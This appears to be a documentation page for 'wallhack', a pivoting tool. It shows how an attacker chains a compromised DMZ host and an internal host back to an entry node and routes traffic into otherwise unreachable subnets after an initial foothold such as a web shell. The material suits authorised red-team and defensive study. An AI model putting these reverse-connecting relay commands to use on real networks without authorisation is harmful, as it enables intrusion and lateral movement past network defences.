---
title: Multi-Hop Example
description: Chain through intermediate relays to reach targets that cannot connect directly.
order: 8
---

# Multi-Hop Example

In this example, three hosts form a chain: an entry node (`192.168.1.5`), a DMZ host (`10.0.1.10`) acting as a relay, and an internal host (`10.10.1.5`) with no direct path to the entry node. The DMZ host connects outward to the entry node and listens inward for the next hop. Once established, traffic to `10.20.0.0/24` and `10.30.0.0/24` routes through the internal host.

The binary reached the DMZ host via initial access — a web shell, exposed service, or similar foothold. From there, it was transferred to the internal host using whatever lateral movement is available: `scp`, a shared mount, or a simple HTTP server on the DMZ host.

{% trafficflow flow="192.168.1.5 (entry) -> 10.0.1.10 (DMZ) -> 10.10.1.5 (internal) -> 10.20.0.0/24, 10.30.0.0/24" label="Traffic Flow:" /%}

{% steps %}
{% step title="Attacker (192.168.1.5)" number=1 %}
An [entry node](/concepts) listening for the first hop. The default transport is QUIC (UDP).

{% codeblock code="wallhack entry --listen :4444" /%}
{% /step %}

{% step title="DMZ Host (10.0.1.10)" number=2 %}
A [relay node](/concepts) connecting to the entry node and listening for the next hop on an arbitrary internal port.

{% codeblock code="wallhack relay --connect 192.168.1.5:4444 --listen :6565" /%}
{% /step %}

{% step title="Internal Host (10.10.1.5)" number=3 %}
An [exit node](/concepts) connecting back to the relay.

{% codeblock code="wallhack exit --connect 10.0.1.10:6565" /%}
{% /step %}

{% step title="Configure Routes" number=4 %}
Add routes for the networks accessible through the internal host. Use the wallhack REPL or the system `ip` tool — both work.

**Via the wallhack REPL** (on the entry node):
```
wallhack> route add 10.20.0.0/24
wallhack> route add 10.30.0.0/24
```

**Via the system `ip` tool** (on the attacker machine):
```bash
ip route add 10.20.0.0/24 dev tun0
ip route add 10.30.0.0/24 dev tun0
```
{% /step %}
{% /steps %}
